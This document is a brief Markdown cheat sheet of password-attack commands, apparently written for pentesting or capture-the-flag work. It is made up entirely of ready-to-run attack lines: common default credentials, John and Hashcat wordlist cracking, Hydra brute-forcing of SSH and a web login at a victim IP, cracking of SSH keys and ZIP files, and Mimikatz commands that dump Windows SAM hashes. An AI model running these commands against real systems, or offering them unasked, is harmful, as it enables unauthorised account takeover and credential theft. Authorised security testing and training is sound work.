### <span style="color:#50FA7B">Default Passwords</span>

```bash
admin:admin
root:root
admin:password
root:toor
```
### <span style="color:#50FA7B">Crack Hash with John</span>
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
### <span style="color:#50FA7B">Crack Hash with Hashcat</span>
```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force
```
Use `hashid hash.txt` to find the hash type
Example: `-m 0 = MD5`, `-m 1000 = NTLM`

### <span style="color:#50FA7B">Brute Force SSH (Hydra)</span>
```bash
hydra -l user -P rockyou.txt ssh://$VICTIM_IP
```
### <span style="color:#50FA7B">Brute Force Web Login (Hydra)</span>
```bash
hydra -l user -P rockyou.txt $VICTIM_IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

### <span style="color:#50FA7B">Crack SSH Private Key</span>

```bash
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
```
### <span style="color:#50FA7B">Dump Windows Hashes (Mimikatz)</span>
```bash
token::elevate
lsadump::sam
```
Then crack:

```bash
hashcat -m 1000 hashes.txt rockyou.txt --force
```
### <span style="color:#50FA7B">Crack ZIP Password</span>
```bash
fcrackzip -u -D -p rockyou.txt file.zip
```
OR

```bash
zip2john file.zip > zip.hash
john zip.hash
```
